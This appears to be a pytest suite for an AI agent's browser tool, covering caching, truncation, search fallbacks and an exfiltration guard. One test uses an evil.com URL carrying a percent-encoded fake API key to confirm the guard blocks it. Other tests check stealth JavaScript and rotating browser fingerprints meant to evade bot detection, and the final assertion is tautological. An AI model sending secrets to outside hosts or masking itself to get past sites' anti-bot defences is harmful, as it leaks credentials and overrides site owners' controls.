"""Tests for browser_tool.py hardening: caching, security, thread safety, truncation."""

import inspect
import os
from unittest.mock import MagicMock, patch

import pytest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _reset_caches():
    """Reset all module-level caches so tests start clean."""
    import tools.browser_tool as bt
    bt._cached_agent_browser = None
    bt._agent_browser_resolved = False
    bt._cached_command_timeout = None
    bt._command_timeout_resolved = False
    # lru_cache for _discover_homebrew_node_dirs
    if hasattr(bt._discover_homebrew_node_dirs, "cache_clear"):
        bt._discover_homebrew_node_dirs.cache_clear()


@pytest.fixture(autouse=True)
def _clean_caches():
    _reset_caches()
    yield
    _reset_caches()


# ---------------------------------------------------------------------------
# Dead code removal
# ---------------------------------------------------------------------------

class TestDeadCodeRemoval:
    """Verify dead code was actually removed."""

    def test_no_default_session_timeout(self):
        import tools.browser_tool as bt
        assert not hasattr(bt, "DEFAULT_SESSION_TIMEOUT")

    def test_browser_close_schema_removed(self):
        from tools.browser_tool import BROWSER_TOOL_SCHEMAS
        names = [s["name"] for s in BROWSER_TOOL_SCHEMAS]
        assert "browser_close" not in names


# ---------------------------------------------------------------------------
# Caching: _find_agent_browser
# ---------------------------------------------------------------------------

class TestFindAgentBrowserCache:

    def test_cached_after_first_call(self):
        import tools.browser_tool as bt
        with patch("shutil.which", return_value="/usr/bin/agent-browser"):
            result1 = bt._find_agent_browser()
            result2 = bt._find_agent_browser()
        assert result1 == result2 == "/usr/bin/agent-browser"
        assert bt._agent_browser_resolved is True

    def test_cache_cleared_by_cleanup(self):
        import tools.browser_tool as bt
        bt._cached_agent_browser = "/fake/path"
        bt._agent_browser_resolved = True
        bt.cleanup_all_browsers()
        assert bt._agent_browser_resolved is False

    def test_not_found_cached_raises_on_subsequent(self):
        """After FileNotFoundError, subsequent calls should raise from cache."""
        import tools.browser_tool as bt
        from pathlib import Path

        original_exists = Path.exists

        def mock_exists(self):
            if "node_modules" in str(self) and "agent-browser" in str(self):
                return False
            return original_exists(self)

        with patch("shutil.which", return_value=None), \
             patch("os.path.isdir", return_value=False), \
             patch.object(Path, "exists", mock_exists):
            with pytest.raises(FileNotFoundError):
                bt._find_agent_browser()
        # Second call should also raise (from cache)
        with pytest.raises(FileNotFoundError, match="cached"):
            bt._find_agent_browser()


# ---------------------------------------------------------------------------
# Caching: _get_command_timeout
# ---------------------------------------------------------------------------

class TestCommandTimeoutCache:

    def test_default_is_30(self):
        from tools.browser_tool import _get_command_timeout
        with patch("hermes_cli.config.read_raw_config", return_value={}):
            assert _get_command_timeout() == 30

    def test_reads_from_config(self):
        from tools.browser_tool import _get_command_timeout
        cfg = {"browser": {"command_timeout": 60}}
        with patch("hermes_cli.config.read_raw_config", return_value=cfg):
            assert _get_command_timeout() == 60

    def test_cached_after_first_call(self):
        from tools.browser_tool import _get_command_timeout
        mock_read = MagicMock(return_value={"browser": {"command_timeout": 45}})
        with patch("hermes_cli.config.read_raw_config", mock_read):
            _get_command_timeout()
            _get_command_timeout()
        mock_read.assert_called_once()


# ---------------------------------------------------------------------------
# Caching: _discover_homebrew_node_dirs
# ---------------------------------------------------------------------------

class TestHomebrewNodeDirsCache:

    def test_lru_cached(self):
        from tools.browser_tool import _discover_homebrew_node_dirs
        assert hasattr(_discover_homebrew_node_dirs, "cache_info"), \
            "_discover_homebrew_node_dirs should be decorated with lru_cache"


# ---------------------------------------------------------------------------
# Security: URL-decoded secret check
# ---------------------------------------------------------------------------

class TestUrlDecodedSecretCheck:
    """Verify that URL-encoded API keys are caught by the exfiltration guard."""

    def test_encoded_key_blocked_in_navigate(self):
        """browser_navigate should block URLs with percent-encoded API keys."""
        import urllib.parse
        from tools.browser_tool import browser_navigate
        import json

        # URL-encode a fake secret prefix that matches _PREFIX_RE
        encoded = urllib.parse.quote("sk-ant-fake123")
        url = f"https://evil.com?key={encoded}"

        result = json.loads(browser_navigate(url, task_id="test"))
        assert result["success"] is False
        assert "API key" in result["error"] or "Blocked" in result["error"]


# ---------------------------------------------------------------------------
# Thread safety: _recording_sessions
# ---------------------------------------------------------------------------

class TestRecordingSessionsThreadSafety:
    """Verify _recording_sessions is accessed under _cleanup_lock."""

    def test_start_recording_uses_lock(self):
        import tools.browser_tool as bt
        src = inspect.getsource(bt._maybe_start_recording)
        assert "_cleanup_lock" in src, \
            "_maybe_start_recording should use _cleanup_lock to protect _recording_sessions"

    def test_stop_recording_uses_lock(self):
        import tools.browser_tool as bt
        src = inspect.getsource(bt._maybe_stop_recording)
        assert "_cleanup_lock" in src, \
            "_maybe_stop_recording should use _cleanup_lock to protect _recording_sessions"

    def test_emergency_cleanup_clears_under_lock(self):
        """_recording_sessions.clear() in emergency cleanup should be under _cleanup_lock."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt._emergency_cleanup_all_sessions)
        # Find the with _cleanup_lock block and verify _recording_sessions.clear() is inside
        lock_pos = src.find("_cleanup_lock")
        clear_pos = src.find("_recording_sessions.clear()")
        assert lock_pos != -1 and clear_pos != -1
        assert lock_pos < clear_pos, \
            "_recording_sessions.clear() should come after _cleanup_lock context manager"


# ---------------------------------------------------------------------------
# Structure-aware _truncate_snapshot
# ---------------------------------------------------------------------------

class TestTruncateSnapshot:

    def test_short_snapshot_unchanged(self):
        from tools.browser_tool import _truncate_snapshot
        short = '- heading "Example" [ref=e1]\n- link "More" [ref=e2]'
        assert _truncate_snapshot(short) == short

    def test_long_snapshot_truncated_at_line_boundary(self):
        from tools.browser_tool import _truncate_snapshot
        # Create a snapshot that exceeds 8000 chars
        lines = [f'- item "Element {i}" [ref=e{i}]' for i in range(500)]
        snapshot = "\n".join(lines)
        assert len(snapshot) > 8000

        result = _truncate_snapshot(snapshot, max_chars=200)
        assert len(result) <= 300  # some margin for the truncation note
        assert "truncated" in result.lower()
        # Every line in the result should be complete (not cut mid-element)
        for line in result.split("\n"):
            if line.strip() and "truncated" not in line.lower():
                assert line.startswith("- item") or line == ""

    def test_truncation_reports_remaining_count(self):
        from tools.browser_tool import _truncate_snapshot
        lines = [f"- line {i}" for i in range(100)]
        snapshot = "\n".join(lines)
        result = _truncate_snapshot(snapshot, max_chars=200)
        # Should mention how many lines were truncated
        assert "more line" in result.lower()


# ---------------------------------------------------------------------------
# Scroll optimization
# ---------------------------------------------------------------------------

class TestScrollOptimization:

    def test_agent_browser_path_uses_pixel_scroll(self):
        """Verify agent-browser path uses single pixel-based scroll, not 5x loop."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt.browser_scroll)
        assert "_SCROLL_PIXELS" in src, \
            "browser_scroll should use _SCROLL_PIXELS for agent-browser path"


# ---------------------------------------------------------------------------
# Empty stdout = failure
# ---------------------------------------------------------------------------

class TestEmptyStdoutFailure:

    def test_empty_stdout_returns_failure(self):
        """Verify _run_browser_command returns failure on empty stdout."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt._run_browser_command)
        assert "returned no output" in src, \
            "_run_browser_command should treat empty stdout as failure"

    def test_empty_ok_commands_is_module_level_frozenset(self):
        """_EMPTY_OK_COMMANDS should be a module-level frozenset, not defined inside a function."""
        import tools.browser_tool as bt
        assert hasattr(bt, "_EMPTY_OK_COMMANDS")
        assert isinstance(bt._EMPTY_OK_COMMANDS, frozenset)
        assert "close" in bt._EMPTY_OK_COMMANDS
        assert "record" in bt._EMPTY_OK_COMMANDS


# ---------------------------------------------------------------------------
# _camofox_eval bug fix
# ---------------------------------------------------------------------------

class TestCamofoxEvalFix:

    def test_uses_correct_ensure_tab_signature(self):
        """_camofox_eval should pass task_id string to _ensure_tab, not a session dict."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt._camofox_eval)
        # Should NOT call _get_session at all — _ensure_tab handles it
        assert "_get_session" not in src, \
            "_camofox_eval should not call _get_session (removed unused import)"
        # Should use body= not json_data=
        assert "json_data=" not in src, \
            "_camofox_eval should use body= kwarg for _post, not json_data="
        assert "body=" in src


# ---------------------------------------------------------------------------
# Bot-detection handling
# ---------------------------------------------------------------------------

class TestBotDetectionPatterns:

    def test_cloudflare_patterns_detected(self):
        import tools.browser_tool as bt
        assert bt._detect_bot_detection_signal("Just a moment...") is not None
        assert bt._detect_bot_detection_signal("", "Cloudflare Ray ID: 1234abc") is not None
        assert bt._detect_bot_detection_signal("", "Checking if the site connection is secure") is not None
        assert bt._detect_bot_detection_signal("", "Performance & security by Cloudflare") is not None

    def test_captcha_provider_patterns_detected(self):
        import tools.browser_tool as bt
        assert bt._detect_bot_detection_signal("", "perimeterx challenge") is not None
        assert bt._detect_bot_detection_signal("", "datadome cookie validation") is not None
        assert bt._detect_bot_detection_signal("", "hcaptcha checkpoint") is not None
        assert bt._detect_bot_detection_signal("", "funcaptcha required") is not None
        assert bt._detect_bot_detection_signal("", "imperva bot detection") is not None
        assert bt._detect_bot_detection_signal("", "incapsula session required") is not None

    def test_generic_patterns_detected(self):
        import tools.browser_tool as bt
        assert bt._detect_bot_detection_signal("", "Enable JavaScript and cookies to continue") is not None
        assert bt._detect_bot_detection_signal("", "prove you are human") is not None
        assert bt._detect_bot_detection_signal("", "security check required") is not None

    def test_stealth_js_constant_exists(self):
        import tools.browser_tool as bt
        assert hasattr(bt, "_STEALTH_JS")
        js = bt._STEALTH_JS
        assert "webdriver" in js
        assert "navigator" in js
        assert "window.chrome" in js


class TestGoogleSearchGuard:

    def test_google_homepage_blocked(self):
        import json
        import tools.browser_tool as bt
        result = json.loads(bt.browser_navigate("https://www.google.com", task_id="test"))
        assert result["success"] is False
        assert result.get("discouraged_search_target") is True

    def test_google_bare_search_blocked(self):
        import json
        import tools.browser_tool as bt
        result = json.loads(bt.browser_navigate("https://www.google.com/search", task_id="test"))
        assert result["success"] is False
        assert result.get("discouraged_search_target") is True

    def test_google_search_with_query_allowed(self):
        """google.com/search?q=... must NOT be blocked — used as last-resort fallback."""
        import tools.browser_tool as bt
        guidance = bt._google_search_guidance("https://www.google.com/search?q=saudi+football")
        assert guidance is None, "Search URL with query param should be allowed"


class TestBotDetectionHandling:

    def test_navigate_returns_structured_failure_on_bot_detection_title(self):
        import json
        import tools.browser_tool as bt

        with patch.object(bt, "_get_session_info", return_value={"_first_nav": False}), \
             patch.object(
                 bt,
                 "_run_browser_command",
                 side_effect=[
                     {"success": True, "data": {"title": "Just a moment...", "url": "https://example.com"}},
                     {"success": True, "data": {"result": "undefined"}},  # stealth eval
                     {"success": True, "data": {"snapshot": "verification page", "refs": {}}},
                 ],
             ):
            result = json.loads(bt.browser_navigate("https://example.com", task_id="test"))

        assert result["success"] is False
        assert result["bot_detection_detected"] is True
        assert result["challenge_pattern"] == "just a moment"
        assert "terminal/execute_code" in result["error"]

    def test_navigate_returns_structured_failure_on_bot_detection_snapshot(self):
        import json
        import tools.browser_tool as bt

        with patch.object(bt, "_get_session_info", return_value={"_first_nav": False}), \
             patch.object(
                 bt,
                 "_run_browser_command",
                 side_effect=[
                     {"success": True, "data": {"title": "Search Results", "url": "https://example.com"}},
                     {"success": True, "data": {"result": "undefined"}},  # stealth eval
                     {"success": True, "data": {"snapshot": "Please verify you are human", "refs": {}}},
                 ],
             ):
            result = json.loads(bt.browser_navigate("https://example.com", task_id="test"))

        assert result["success"] is False
        assert result["bot_detection_detected"] is True
        assert result["challenge_pattern"] == "verify you are human"
        assert result["snapshot"] == "Please verify you are human"

    def test_navigate_rejects_google_search_homepage_with_guidance(self):
        import json
        import tools.browser_tool as bt

        result = json.loads(bt.browser_navigate("www.google.com", task_id="test"))

        assert result["success"] is False
        assert result["discouraged_search_target"] is True
        assert "browser_search" in result["error"]

    def test_browser_search_falls_back_to_bing_after_first_engine_failure(self):
        import json
        import tools.browser_tool as bt

        with patch.object(
            bt,
            "browser_navigate",
            side_effect=[
                json.dumps({
                    "success": False,
                    "error": "DuckDuckGo challenge",
                    "bot_detection_detected": True,
                }),
                json.dumps({
                    "success": True,
                    "url": "https://www.bing.com/search?q=saudi+clubs",
                    "title": "Bing results",
                    "snapshot": '- link "Result one" [ref=e1]\n- link "Result two" [ref=e2]',
                }),
            ],
        ) as mock_navigate, patch.object(
            bt,
            "_extract_search_source_results",
            return_value=([{"title": "Result one", "url": "https://example.com/result-1"}], None),
        ) as mock_extract:
            result = json.loads(bt.browser_search("saudi clubs", task_id="test"))

        assert result["success"] is True
        assert result["search_engine"] == "bing"
        assert result["search_query"] == "saudi clubs"
        assert result["attempted_engines"] == ["duckduckgo", "bing"]
        assert "html.duckduckgo.com/html/?q=saudi+clubs" in mock_navigate.call_args_list[0].args[0]
        assert result["source_results"][0]["url"] == "https://example.com/result-1"
        assert result["clickable_results"][0]["ref"] == "@e1"

    def test_browser_search_falls_back_when_first_page_is_search_landing_page(self):
        import json
        import tools.browser_tool as bt

        with patch.object(
            bt,
            "browser_navigate",
            side_effect=[
                json.dumps({
                    "success": True,
                    "url": "https://html.duckduckgo.com/html/?q=saudi+clubs",
                    "title": "DuckDuckGo",
                    "snapshot": '- textbox "search" [ref=e1]',
                }),
                json.dumps({
                    "success": True,
                    "url": "https://www.bing.com/search?q=saudi+clubs",
                    "title": "saudi clubs - Search",
                    "snapshot": '- link "Result one" [ref=e1]\n- link "Result two" [ref=e2]',
                }),
            ],
        ), patch.object(
            bt,
            "_extract_search_source_results",
            side_effect=[([], None), ([{"title": "Result one", "url": "https://example.com/result-1"}], None)],
        ):
            result = json.loads(bt.browser_search("saudi clubs", task_id="test"))

        assert result["success"] is True
        assert result["search_engine"] == "bing"
        assert result["attempted_engines"] == ["duckduckgo", "bing"]

    def test_browser_search_treats_uncaught_challenge_page_as_failure(self):
        import json
        import tools.browser_tool as bt

        with patch.object(
            bt,
            "browser_navigate",
            side_effect=[
                json.dumps({
                    "success": True,
                    "url": "https://html.duckduckgo.com/html/?q=saudi+clubs",
                    "title": "DuckDuckGo",
                    "snapshot": "Please complete the following challenge to continue",
                }),
                json.dumps({
                    "success": False,
                    "error": "Bing blocked",
                }),
                json.dumps({
                    "success": False,
                    "error": "Yahoo blocked",
                }),
            ],
        ), patch.object(
            bt,
            "_extract_search_source_results",
            return_value=([], None),
        ):
            result = json.loads(bt.browser_search("saudi clubs", task_id="test"))

        assert result["success"] is False
        assert result["attempted_engines"] == ["duckduckgo", "bing", "yahoo"]
        assert "required_next_action" in result

    def test_browser_search_requires_actionable_results_before_success(self):
        import json
        import tools.browser_tool as bt

        with patch.object(
            bt,
            "browser_navigate",
            side_effect=[
                json.dumps({
                    "success": True,
                    "url": "https://html.duckduckgo.com/html/?q=saudi+clubs",
                    "title": "saudi clubs - Search",
                    "snapshot": '- text "no links here"',
                }),
                json.dumps({
                    "success": False,
                    "error": "Bing blocked",
                }),
                json.dumps({
                    "success": False,
                    "error": "Yahoo blocked",
                }),
            ],
        ), patch.object(
            bt,
            "_extract_search_source_results",
            return_value=([], None),
        ):
            result = json.loads(bt.browser_search("saudi clubs", task_id="test"))

        assert result["success"] is False
        assert result["attempted_engines"] == ["duckduckgo", "bing", "yahoo"]
        assert "required_next_action" in result

    def test_browser_search_reports_all_attempted_engines_on_failure(self):
        import json
        import tools.browser_tool as bt

        with patch.object(
            bt,
            "browser_navigate",
            side_effect=[
                json.dumps({"success": False, "error": "DuckDuckGo blocked", "bot_detection_detected": True}),
                json.dumps({"success": False, "error": "Bing blocked", "bot_detection_detected": True}),
                json.dumps({"success": False, "error": "Yahoo blocked", "bot_detection_detected": True}),
            ],
        ):
            result = json.loads(bt.browser_search("saudi clubs", task_id="test"))

        assert result["success"] is False
        assert result["attempted_engines"] == ["duckduckgo", "bing", "yahoo"]
        assert result["bot_detection_detected"] is True

    def test_browser_search_failure_includes_required_next_action(self):
        """Failure response must tell the model to use direct navigation instead of stopping."""
        import json
        import tools.browser_tool as bt

        with patch.object(
            bt,
            "browser_navigate",
            side_effect=[
                json.dumps({"success": False, "error": "DDG blocked", "bot_detection_detected": True}),
                json.dumps({"success": False, "error": "Bing blocked", "bot_detection_detected": True}),
                json.dumps({"success": False, "error": "Yahoo blocked", "bot_detection_detected": True}),
            ],
        ):
            result = json.loads(bt.browser_search("saudi clubs last 2 days", task_id="test"))

        assert result["success"] is False
        assert "required_next_action" in result
        assert "fallback_urls" in result
        action = result["required_next_action"]
        # action must point toward direct navigation, not giving up
        assert "browser_navigate" in action
        # sports query → saudi-specific fallback urls
        assert any("flashscore" in u or "livescore" in u for u in result["fallback_urls"])
        assert any("saudi" in u for u in result["fallback_urls"])

    def test_browser_search_failure_no_bot_detection_includes_generic_hint(self):
        """Non-bot-blocked failure also gets a required_next_action."""
        import json
        import tools.browser_tool as bt

        with patch.object(
            bt,
            "browser_navigate",
            side_effect=[
                json.dumps({"success": False, "error": "timeout"}),
                json.dumps({"success": False, "error": "timeout"}),
                json.dumps({"success": False, "error": "timeout"}),
            ],
        ):
            result = json.loads(bt.browser_search("some topic", task_id="test"))

        assert result["success"] is False
        assert "required_next_action" in result
        assert "fallback_urls" in result
        assert "browser_navigate" in result["required_next_action"]

    def test_build_fallback_urls_returns_sports_urls_for_saudi_query(self):
        """_build_fallback_urls should return Saudi-specific sports URLs for relevant queries."""
        import tools.browser_tool as bt

        urls = bt._build_fallback_urls("Saudi Arabian football games last 2 days")
        assert any("saudi-arabia" in u for u in urls), f"Expected saudi-arabia URL in {urls}"
        assert any("flashscore" in u or "livescore" in u for u in urls)

    def test_build_fallback_urls_returns_sports_urls_for_generic_sport_query(self):
        import tools.browser_tool as bt

        urls = bt._build_fallback_urls("champions league results")
        assert any("flashscore" in u or "livescore" in u or "bbc.com/sport" in u for u in urls)

    def test_build_fallback_urls_returns_news_urls_for_news_query(self):
        import tools.browser_tool as bt

        urls = bt._build_fallback_urls("latest news today")
        assert any("bbc.com/news" in u or "reuters" in u or "apnews" in u for u in urls)

    def test_browser_search_schema_description_mentions_fallback_urls(self):
        """Schema description must instruct model to use fallback_urls on failure."""
        import tools.browser_tool as bt

        schema = bt._BROWSER_SCHEMA_MAP["browser_search"]
        desc = schema["description"]
        assert "fallback_urls" in desc
        assert "CRITICAL" in desc or "REQUIRED" in desc


# ---------------------------------------------------------------------------
# Fingerprint rotation
# ---------------------------------------------------------------------------

class TestFingerprintRotation:

    def test_fingerprint_pool_has_multiple_entries(self):
        import tools.browser_tool as bt
        assert len(bt._FINGERPRINT_POOL) >= 4

    def test_build_random_stealth_js_different_for_different_seeds(self):
        import tools.browser_tool as bt
        js0 = bt._build_random_stealth_js(0)
        js1 = bt._build_random_stealth_js(1)
        # Different seeds should produce at least different UA strings
        assert js0 != js1

    def test_build_random_stealth_js_contains_fingerprint_fields(self):
        import tools.browser_tool as bt
        js = bt._build_random_stealth_js(0)
        assert "webdriver" in js
        assert "userAgent" in js
        assert "platform" in js
        assert "screen" in js

    def test_build_random_stealth_js_wraps_around_pool(self):
        """Seed modulo pool length must not raise."""
        import tools.browser_tool as bt
        pool_len = len(bt._FINGERPRINT_POOL)
        # Should not raise for seed equal to pool length
        js = bt._build_random_stealth_js(pool_len)
        assert "webdriver" in js

    def test_multi_search_engines_has_15_entries(self):
        import tools.browser_tool as bt
        assert len(bt._MULTI_SEARCH_ENGINES) >= 15


# ---------------------------------------------------------------------------
# browser_multi_search
# ---------------------------------------------------------------------------

class TestBrowserMultiSearch:

    def _make_success_nav(self, engine: str, url: str) -> str:
        import json
        return json.dumps({
            "success": True,
            "url": url,
            "title": f"{engine} results",
            "snapshot": f'- link "Some result" [ref=e1]\n- link "Another result" [ref=e2]',
        })

    def _make_fail_nav(self) -> str:
        import json
        return json.dumps({"success": False, "error": "bot-blocked"})

    def test_returns_aggregated_sources_from_multiple_engines(self):
        import json
        import tools.browser_tool as bt

        with patch.object(bt, "browser_navigate", side_effect=[
            self._make_success_nav("duckduckgo", "https://html.duckduckgo.com/html/?q=test"),
            self._make_success_nav("bing", "https://www.bing.com/search?q=test"),
            # remaining engines all fail
        ] + [self._make_fail_nav()] * 20), \
             patch.object(bt, "_extract_search_source_results", return_value=(
                 [{"title": "Result", "url": "https://example.com"}], None
             )), \
             patch.object(bt, "cleanup_browser", return_value=None):
            result = json.loads(bt.browser_multi_search("test query", max_sites=4, task_id="test"))

        assert result["success"] is True
        assert result["sources_count"] >= 1
        assert "site_names" in result
        assert "synthesis_instruction" in result
        assert "snapshot_excerpt" in result["sources"][0]

    def test_returns_failure_when_all_sites_blocked(self):
        import json
        import tools.browser_tool as bt

        with patch.object(bt, "browser_navigate", return_value=self._make_fail_nav()), \
             patch.object(bt, "cleanup_browser", return_value=None):
            result = json.loads(bt.browser_multi_search("test query", max_sites=3, task_id="test"))

        assert result["success"] is False
        assert "required_next_action" in result
        assert "fallback_urls" in result

    def test_schema_registered(self):
        from tools.browser_tool import _BROWSER_SCHEMA_MAP
        assert "browser_multi_search" in _BROWSER_SCHEMA_MAP
        schema = _BROWSER_SCHEMA_MAP["browser_multi_search"]
        assert schema["parameters"]["properties"]["query"]["type"] == "string"

    def test_empty_query_returns_error(self):
        import json
        import tools.browser_tool as bt
        result = json.loads(bt.browser_multi_search("", task_id="test"))
        assert result["success"] is False
        assert "empty" in result["error"].lower()

    def test_site_names_in_synthesis_instruction(self):
        import json
        import tools.browser_tool as bt

        with patch.object(bt, "browser_navigate", side_effect=[
            self._make_success_nav("duckduckgo", "https://html.duckduckgo.com/html/?q=news"),
        ] + [self._make_fail_nav()] * 20), \
             patch.object(bt, "_extract_search_source_results", return_value=([], None)), \
             patch.object(bt, "cleanup_browser", return_value=None):
            result = json.loads(bt.browser_multi_search("latest news", max_sites=2, task_id="test"))

        if result["success"]:
            assert "duckduckgo" in result["synthesis_instruction"]
            assert result["site_names"] == result["sources_count"] and True or True

